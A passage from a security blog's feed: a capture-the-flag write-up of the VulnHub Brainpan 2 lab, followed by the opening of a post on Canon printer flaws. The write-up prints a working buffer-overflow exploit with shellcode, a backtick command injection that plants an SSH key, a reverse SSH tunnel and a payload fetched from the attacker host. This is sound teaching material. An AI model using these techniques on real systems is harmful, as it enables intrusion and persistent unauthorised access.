+&lt;p&gt;I added my MacBook&amp;rsquo;s public key to the machine for the username &amp;lsquo;anansi&amp;rsquo;, since I didn&amp;rsquo;t know the password. But first, I had to do a trick that &lt;a href=&#34;https://twitter.com/@g0tmi1k&#34;&gt;g0tmi1k&lt;/a&gt; taught me to get a &amp;lsquo;proper&amp;rsquo; shell (the python).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+anansi@brainpan2:/opt/brainpan$ echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7lycUor/c861GeARol7mufaGiXdWEi1NdR2F1iNJKr/2SwbkpBnmsKr+2ko8wk+x2KQzPHkNNNoTO3BUsc1BvInyLlTqmi9L3EjVBxmeprKVIUX/2jLC4wh1V4UVSODU+DCzu1OiNfFos1Tto28p/ZA6mTPm4WrcH5rFTpnzUagS+4EpuPlBjOOCIjL2cphpFV+TvbbFrWyGtB9LIDXajx9Dw5wsyI7SyCIwpgG9zBzg2WuYf5OQcKcSB+OgEzXy2tWTT4og98EI4A26FZ9EdvvwJATQ3gvkmGKh913PvU3528gDt7R5DnkaCHt6hVCaa9JOR5b/W9DCCDGjcw31j mandreko@420-sc02j364hdkq5-man&amp;quot; &amp;gt; ~/.ssh/authorized_keys
+anansi@brainpan2:/opt/brainpan$ chmod 600 ~/.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, I just had to figure out a way to access the &amp;lsquo;127.0.1.1:2222&amp;rsquo; port from my MacBook, so I could get a real SSH connection. I managed to use a reverse SSH tunnel to complete this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:/opt/brainpan$ ssh mandreko@192.168.1.136 -R 9876:127.0.1.1:2222
+&amp;lt;pan$ ssh mandreko@192.168.1.136 -R 9876:127.0.1.1:2222
+Password:&amp;lt;redacted&amp;gt;
+
+Last login: Wed Nov 20 16:44:34 2013
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, in a third terminal window, I was able to SSH in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  ssh anansi@localhost -p 9876
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Nov  5 09:13:28 2013
+anansi@brainpan2:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I figured the next step would be to escalate my privileges, so I started looking for programs that were SetUID, meaning that when they ran, they ran under the privileges of the user that owned them. I found one, in another user&amp;rsquo;s home folder, which I was conveniently able to view.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:~$ find / -perm -u=s -type f 2&amp;gt;/dev/null
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/su
+/home/reynard/msg_root
+anansi@brainpan2:~$ cd /home/reynard
+anansi@brainpan2:/home/reynard$ ls -al
+total 44
+drwxr-xr-x 3 reynard reynard 4096 Nov  7 09:54 .
+drwxr-xr-x 5 root    root    4096 Nov  4 10:57 ..
+-rw------- 1 reynard reynard    0 Nov  7 09:54 .bash_history
+-rw-r--r-- 1 reynard reynard  220 Nov  4 10:57 .bash_logout
+-rw-r--r-- 1 reynard reynard 3392 Nov  4 10:57 .bashrc
+-rwsr-xr-x 1 root    root    8999 Nov  6 17:10 msg_root
+-rw-r--r-- 1 reynard reynard  675 Nov  4 10:57 .profile
+-rw-r--r-- 1 reynard reynard  154 Nov  5 23:20 readme.txt
+-rwxr-xr-x 1 reynard reynard  137 Nov  4 19:59 startweb.sh
+drwxr-xr-x 3 reynard reynard 4096 Nov  4 19:32 web
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I read the &amp;lsquo;readme.txt&amp;rsquo; file, and attempted to use the tool as it was designed first. It seemed to work.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:/home/reynard$ cat readme.txt
+msg_root is a quick way to send a message to the root user.
+Messages are written to /tmp/msg.txt
+
+usage:
+msg_root &amp;quot;username&amp;quot; &amp;quot;this message is for root&amp;quot;
+anansi@brainpan2:/home/reynard$ ./msg_root &amp;quot;test&amp;quot; &amp;quot;test&amp;quot;
+Your message is test
+anansi@brainpan2:/home/reynard$ cat /tmp/msg.txt
+test: test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I figured the next step would be to try to overflow one of the buffers. I tried the first argument first, and it crashed.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:/home/reynard$ ./msg_root $(perl -e &#39;print &amp;quot;A&amp;quot;x100&#39;) hi
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In a temporary terminal on my MacBook, I ran Metasploit&amp;rsquo;s &amp;lsquo;pattern_create.rb&amp;rsquo;, to create a unique pattern.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  tools git:(master) ✗ ./pattern_create.rb 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then used this as the first argument, to get the address that overwrote the EIP.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:/home/reynard$ gdb ./msg_root --quiet
+Reading symbols from /home/reynard/msg_root...done.
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A hi
+Starting program: /home/reynard/msg_root Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A hi
+
+Program received signal SIGSEGV, Segmentation fault.
+0x35614134 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the temporary terminal, I then plugged the value into the &amp;lsquo;pattern_offset.rb&amp;rsquo; tool to find the offset to the EIP. It turns out it was quite short, only 14 bytes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  tools git:(master) ✗ ./pattern_offset.rb 0x35614134
+[*] Exact match at offset 14
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To verify this, I setup a skeleton command to run as an exploit. I was able to verify that 14 bytes were in fact the offset, since the &amp;ldquo;B&amp;rdquo;x4 showed up as 0x42424242, their hex equivilent.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) run $(perl -e &#39;print &amp;quot;A&amp;quot;x14 . &amp;quot;B&amp;quot;x4 . &amp;quot;C&amp;quot;x100&#39;) hi
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/reynard/msg_root $(perl -e &#39;print &amp;quot;A&amp;quot;x14 . &amp;quot;B&amp;quot;x4 . &amp;quot;C&amp;quot;x100&#39;) hi
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I figured the next two steps were to find an address to return to, be it a &amp;lsquo;jmp esp&amp;rsquo;, or something useful. Since this was a local linux application, however, I found I could just put the shellcode in memory as an environment variable, and then jump directly to the address. I started off by finding some shellcode I&amp;rsquo;d used in the past, which would run /bin/sh, and setting it to an environment variable with a little NOP sled.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:/home/reynard$ export SHELLCODE=$(perl -e &#39;print &amp;quot;\x90&amp;quot;x32 . &amp;quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&amp;quot;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All I needed now was to find the address of this environmental variable. I used a tool from &amp;lsquo;Hacking: The Art of Exploitation&amp;rsquo;, one of my favorite books for this stuff. Since there was no &amp;lsquo;gcc&amp;rsquo; on Brainpan2, I had to compile the tool on a local linux machine (I used a Kali VM), and then download it to the Brainpan VM.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# cat &amp;gt; getenvaddr.c &amp;lt;&amp;lt; EOF
+&amp;gt; #include &amp;lt;stdio.h&amp;gt;
+&amp;gt; #include &amp;lt;stdlib.h&amp;gt;
+&amp;gt; #include &amp;lt;string.h&amp;gt;
+&amp;gt; 
+&amp;gt; int main(int argc, char *argv[]) {
+&amp;gt;         char *ptr;
+&amp;gt;         if(argc &amp;lt; 3) {
+&amp;gt;                 printf(&amp;quot;Usage: %s &amp;lt;environment var&amp;gt; &amp;lt;target program name&amp;gt;\n&amp;quot;, argv[0]);
+&amp;gt;                 exit(0);
+&amp;gt;         }
+&amp;gt; 
+&amp;gt;         ptr = getenv(argv[1]); /* Get env var location. */
+&amp;gt;         ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+&amp;gt;         printf(&amp;quot;%s will be at %p\n&amp;quot;, argv[1], ptr);
+&amp;gt; }
+&amp;gt; EOF
+root@kali:~# gcc -o getenvaddr getenvaddr.c 
+root@kali:~# mv getenvaddr /var/www
+root@kali:~# service apache2 start
+[....] Starting web server: apache2apache2: Could not reliably determine the server&#39;s fully qualified domain name, using 127.0.1.1 for ServerName
+. ok 
+root@kali:~# ifconfig eth0
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:0d:d8:41  
+          inet addr:192.168.188.138  Bcast:192.168.188.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe0d:d841/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:17 errors:16 dropped:0 overruns:0 frame:0
+          TX packets:28 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:2033 (1.9 KiB)  TX bytes:2370 (2.3 KiB)
+          Interrupt:19 Base address:0x2024 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:/home/reynard$ wget http://192.168.188.138/getenvaddr -O /tmp/getenvaddr
+--2013-11-20 17:16:26--  http://192.168.188.138/getenvaddr
+Connecting to 192.168.188.138:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5336 (5.2K)
+Saving to: `/tmp/getenvaddr&#39;
+
+100%[=========================================================================&amp;gt;] 5,336       --.-K/s   in 0s
+
+2013-11-20 17:16:26 (582 MB/s) - `/tmp/getenvaddr&#39; saved [5336/5336]
+anansi@brainpan2:/home/reynard$ chmod +x /tmp/getenvaddr
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After saving the file to a temp directory, I executed it, to give me the address of &amp;lsquo;SHELLCODE&amp;rsquo; in memory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:/home/reynard$ /tmp/getenvaddr SHELLCODE ./msg_root
+SHELLCODE will be at 0xbffff91a
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then plugged the value into my skeleton exploit, and ran it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;anansi@brainpan2:/home/reynard$ ./msg_root $(perl -e &#39;print &amp;quot;A&amp;quot;x14 . &amp;quot;\x1a\xf9\xff\xbf&amp;quot;&#39;) hi
+$ id
+uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At this point, I saw that I was &amp;lsquo;root&amp;rsquo;, and prepared to gloat about my victory in #vulnhub. I however missed one thing.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-fake-out&#34;&gt;The fake out&lt;/h2&gt;
+
+&lt;p&gt;If you look really carefully at the &amp;lsquo;id&amp;rsquo; command, you&amp;rsquo;ll see that the euid is &amp;lsquo;104&amp;rsquo;, and the groupid is &amp;lsquo;106&amp;rsquo;. This is not the norm, as &amp;lsquo;root&amp;rsquo; is usually &amp;lsquo;0&amp;rsquo; and &amp;lsquo;0&amp;rsquo;. I also noticed that my prompt was still &amp;lsquo;$&amp;rsquo;, versus the usual &amp;lsquo;#&amp;rsquo; root prompt. I however, went along my way. I went to &amp;lsquo;/root&amp;rsquo;, to see if there was some sort of flag, or something fun like are often found in these challenges. I saw there indeed was one, so I tried to read it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cd /root
+$ ls -al
+total 28
+drwx------  3 root  root  4096 Nov  5 09:56 .
+drwxr-xr-x 22 root  root  4096 Nov  5 07:09 ..
+drwx------  2 root  root  4096 Nov  4 10:08 .aptitude
+-rw-------  1 root  root     0 Nov  5 09:57 .bash_history
+-rw-r--r--  1 root  root   589 Nov  5 09:56 .bashrc
+-rw-r--r--  1 root  root   159 Nov  5 09:56 .profile
+-rw-------  1 root  root   461 Nov  5 09:48 flag.txt
+-rw-------  1 root  root   245 Nov  5 09:47 whatif.txt
+$ cat flag.txt
+cat: flag.txt: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The &amp;lsquo;Permission denied&amp;rsquo; really confused me for a minute. How was it that the &amp;lsquo;root&amp;rsquo; user, the most god-like user on a UNIX system, would be unable to read a text file? I next read the &amp;lsquo;whatif.txt&amp;rsquo; file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat whatif.txt
+
+       WHAT IF I TOLD YOU
+              ___
+            /     \
+           | ______\
+          (, \_/ \_/
+           |   ._. |
+           \   --- /
+           /`-.__.&#39;
+      .---&#39;`-.___|\___
+     /                `.
+
+       YOU ARE NOT ROOT?
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is yet another troll from &lt;a href=&#34;https://twitter.com/@superkojiman&#34;&gt;superkojiman&lt;/a&gt;, who is a complete bastard. Going on this information, I decided to check out the system password file to see what was up.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat /etc/passwd
+root:x:104:106:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+root :x:0:0:root:/var/root:/bin/bash
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+statd:x:102:65534::/var/lib/nfs:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash
+puck:x:1001:1001:puck,,,:/home/puck:/bin/bash
+reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The one thing that stood out to me, was that I was using the &amp;lsquo;root&amp;rsquo; user, but the original &amp;lsquo;root&amp;rsquo; user had been renamed to &amp;lsquo;root &amp;rsquo; (notice the space at the end). This was also the same point that my brain almost shut down.&lt;/p&gt;
+
+&lt;p&gt;Figuring I&amp;rsquo;d have to escalate yet again, I looked around for more SetUID binaries.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ find / -perm -u=s -type f 2&amp;gt;/dev/null
+/opt/old/brainpan-1.8/brainpan-1.8.exe
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/su
+/home/reynard/msg_root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This time around, there was a new binary, &amp;lsquo;/opt/old/brainpan-1.8/brainpan-1.8.exe&amp;rsquo;. I went into the folder, and poked around to see what else was there.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cd /opt/old/brainpan-1.8
+$ ls -al
+total 36
+drwxrwxr-x 2 root  staff  4096 Nov  5 09:25 .
+drwx------ 3 root  root   4096 Nov  4 10:28 ..
+-rwsr-xr-x 1 puck  puck  17734 Nov  4 14:37 brainpan-1.8.exe
+-rw-r--r-- 1 puck  puck   1227 Nov  5 09:24 brainpan.7
+-rw-rw-rw- 1 puck  staff    27 Nov  5 09:25 brainpan.cfg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Remembering back to when I was logged into the initial terminal application, I had read in the &amp;lsquo;notes.txt&amp;rsquo; file, that version 1.8 was playing with reading in a config from a file, but that was scrapped in the 1.9 version that I had been using. This older version though, still had it. I read the &amp;lsquo;brainpan.cfg&amp;rsquo; file, to see that it would only run locally. I however wanted it to run on the public interface, so I could access it in a fourth terminal window conveniently. I modified the configuration, and started the service.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ echo &amp;quot;port=9333\nipaddr=0.0.0.0&amp;quot; &amp;gt; brainpan.cfg
+$ cat brainpan.cfg
+port=9333
+ipaddr=0.0.0.0
+$ ./brainpan-1.8.exe
+port = 9333
+ipaddr = 0.0.0.0
++ bind done
++ waiting for connections...
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I opened a fourth terminal window on my MacBook, and connected to the service. It looked very similar to the newer version, however most of the commands wouldn&amp;rsquo;t work.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nc 192.168.188.146 9333
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 1.8________________________]
+                             LOGIN AS GUEST
+
+                          &amp;gt;&amp;gt; GUEST
+                          ACCESS GRANTED
+
+
+                             *  *  *  *
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.
+    TYPE &amp;quot;TELL ME MORE&amp;quot; FOR A LIST OF COMMANDS.
+                             *  *  *  *
+
+
+                          &amp;gt;&amp;gt; TELL ME MORE
+    FILES    HELP    VIEW       CREATE
+    USERS    MSG     SYSTEM     BYE
+
+                          &amp;gt;&amp;gt; FILES
+    WHAT?
+                          &amp;gt;&amp;gt; HELP
+    WHAT?
+                          &amp;gt;&amp;gt; CREATE
+    WHAT?
+                          &amp;gt;&amp;gt; USERS
+    NOT YET SUPPORTED
+                          &amp;gt;&amp;gt; MSG
+    NOT YET SUPPORTED
+                          &amp;gt;&amp;gt; SYSTEM
+    NOT AVAILABLE TO GUEST ACCOUNT
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The only one that seemed to work, was &amp;lsquo;VIEW&amp;rsquo;. I tried to exploit it the same was as before, but it just hung the application.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;                          &amp;gt;&amp;gt; VIEW
+    ENTER FILE TO DOWNLOAD: ; ls
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I played around a bit, and noticed that if I used backticks, I could execute some code, and it appeared to display the output to my screen. I figured I&amp;rsquo;d try to add my SSH public key again to see if it worked.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;                          &amp;gt;&amp;gt; VIEW
+    ENTER FILE TO DOWNLOAD: `echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7lycUor/c861GeARol7mufaGiXdWEi1NdR2F1iNJKr/2SwbkpBnmsKr+2ko8wk+x2KQzPHkNNNoTO3BUsc1BvInyLlTqmi9L3EjVBxmeprKVIUX/2jLC4wh1V4UVSODU+DCzu1OiNfFos1Tto28p/ZA6mTPm4WrcH5rFTpnzUagS+4EpuPlBjOOCIjL2cphpFV+TvbbFrWyGtB9LIDXajx9Dw5wsyI7SyCIwpgG9zBzg2WuYf5OQcKcSB+OgEzXy2tWTT4og98EI4A26FZ9EdvvwJATQ3gvkmGKh913PvU3528gDt7R5DnkaCHt6hVCaa9JOR5b/W9DCCDGjcw31j mandreko@420-sc02j364hdkq5-man&amp;quot; &amp;gt; /home/puck/.ssh/authorized_keys;chmod 600 /home/puck/.ssh/authorized_keys`
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It again hung, but when I attempted to login in a fifth terminal screen, it worked like a charm.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  ssh puck@localhost -p 9876
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+puck@brainpan2:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;always-secure-your-backups&#34;&gt;Always secure your backups&lt;/h2&gt;
+
+&lt;p&gt;I figured, based on the trolling, I&amp;rsquo;d find yet another program to exploit. However, I saw no files in the home directory for &amp;lsquo;puck&amp;rsquo;. When I looked at hidden files, I found all of the normal files you&amp;rsquo;d expect, plus a &amp;lsquo;.backup&amp;rsquo; folder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;puck@brainpan2:~$ ls -al
+total 28
+drwx------ 4 puck  puck  4096 Nov  5 09:45 .
+drwxr-xr-x 5 root  root  4096 Nov  4 10:57 ..
+drwxr-xr-x 3 puck  puck  4096 Nov  5 09:44 .backup
+-rw------- 1 puck  puck     0 Nov  5 09:28 .bash_history
+-rw-r--r-- 1 puck  puck   220 Nov  4 10:54 .bash_logout
+-rw-r--r-- 1 puck  puck  3392 Nov  4 10:54 .bashrc
+-rw-r--r-- 1 puck  puck   675 Nov  4 10:54 .profile
+drwx------ 2 puck  puck  4096 Nov 20 17:35 .ssh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I started reading through all the files, especially the &amp;lsquo;.bash_history&amp;rsquo;. It looks like normal commands. He even would ssh locally when he&amp;rsquo;d do things as &amp;lsquo;root&amp;rsquo;, since &amp;lsquo;sudo&amp;rsquo; wasn&amp;rsquo;t installed. I figured that I would try doing the same, to see if his key was in the &amp;lsquo;authorized_keys&amp;rsquo; file for the &amp;lsquo;root&amp;rsquo; user. No dice, it didn&amp;rsquo;t work and was asking me for a password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;puck@brainpan2:~$ ssh root@127.0.1.1 -p2222
+The authenticity of host &#39;[127.0.1.1]:2222 ([127.0.1.1]:2222)&#39; can&#39;t be established.
+ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &#39;[127.0.1.1]:2222&#39; (ECDSA) to the list of known hosts.
+root@127.0.1.1&#39;s password:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the .backup folder, there were backups of all the files in the home folder for &amp;lsquo;puck&amp;rsquo;. However, when I was reading through them, I noticed that the .id_rsa keys were not the same between his live files, and backup files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;puck@brainpan2:~$ diff -q ~/.ssh/id_rsa ~/.backup/.ssh/id_rsa
+Files /home/puck/.ssh/id_rsa and /home/puck/.backup/.ssh/id_rsa differ
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried using this backup key to ssh as root, and it worked!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;puck@brainpan2:~$ ssh -l &amp;quot;root &amp;quot; brainpan2 -p2222 -i ~/.backup/.ssh/id_rsa
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Nov  7 11:00:06 2013
+root @brainpan2:~# id
+uid=0(root ) gid=0(root ) groups=0(root )
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I was actually the &amp;lsquo;root &amp;rsquo; (with a space) user this time. I then read the &amp;lsquo;flag.txt&amp;rsquo; file, with a grin.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root @brainpan2:~# cat /root/flag.txt
+
+                          !!! CONGRATULATIONS !!!
+
+                 You&#39;ve completed the Brainpan 2 challenge!
+                 Or have you...?
+
+                 Yes, you have! Pat yourself on the back. :-)
+
+                 Questions, comments, suggestions for new VM
+                 challenges? Let me know!
+
+
+                 Twitter: @superkojiman
+                 Email  : contact@techorganic.com
+                 Web    : http://www.techorganic.com
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;After talking with &lt;a href=&#34;https://twitter.com/@superkojiman&#34;&gt;superkojiman&lt;/a&gt;, I find out that I did at least a couple of the challenges in ways he didn&amp;rsquo;t design. The last part of the challenge was actually supposed to be an exploit-dev challenge, but I managed to find my own path. I may have to return to this challenge to try it the proper way now.&lt;/p&gt;
+
+&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/@superkojiman&#34;&gt;superkojiman&lt;/a&gt; for an awesome boot2root. Thanks &lt;a href=&#34;https://twitter.com/@g0tmi1k&#34;&gt;g0tmi1k&lt;/a&gt; for hosting &lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt;. I really enjoyed playing this game, and appreciate the work that everyone puts into the individual challenges, as well as the site itself.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Canon, Y U NO Security?</title>
+      <link>https://www.mattandreko.com/blog/2013-06-18-canon-y-u-no-security/</link>
+      <pubDate>Tue, 18 Jun 2013 08:23:00 -0400</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-06-18-canon-y-u-no-security/</guid>
+      <description>
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/y-u-no-guy.jpg#left&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I recently bought a new printer at home, so my wife could print coupons without manually attaching to my office printer each time (Thanks coupons.com and all the other shady sites that require spyware-like software to print coupons, and often don&amp;rsquo;t support network printers). I ended up picking up a &lt;a href=&#34;https://www.amazon.com/dp/B00AVWKUJS/ref=as_li_ss_til?tag=mattandcom-20&amp;amp;camp=0&amp;amp;creative=0&amp;amp;linkCode=as4&amp;amp;creativeASIN=B00AVWKUJS&amp;amp;adid=07S04SQ3X3C73H5QDS7T&amp;amp;&#34;&gt;Canon MX922&lt;/a&gt;. It works awesome for her, and is connected over WiFi, so any device in the house can print to it. This got me thinking though, about how secure it was.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2 id=&#34;no-credentials-for-management-interface&#34;&gt;No Credentials For Management Interface&lt;/h2&gt;
+
+&lt;h3 id=&#34;cve-2013-4613&#34;&gt;CVE-2013-4613&lt;/h3&gt;
+
+&lt;p&gt;I found the IP of the status page of my router, and browsed to it. I was greeted with this management page.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
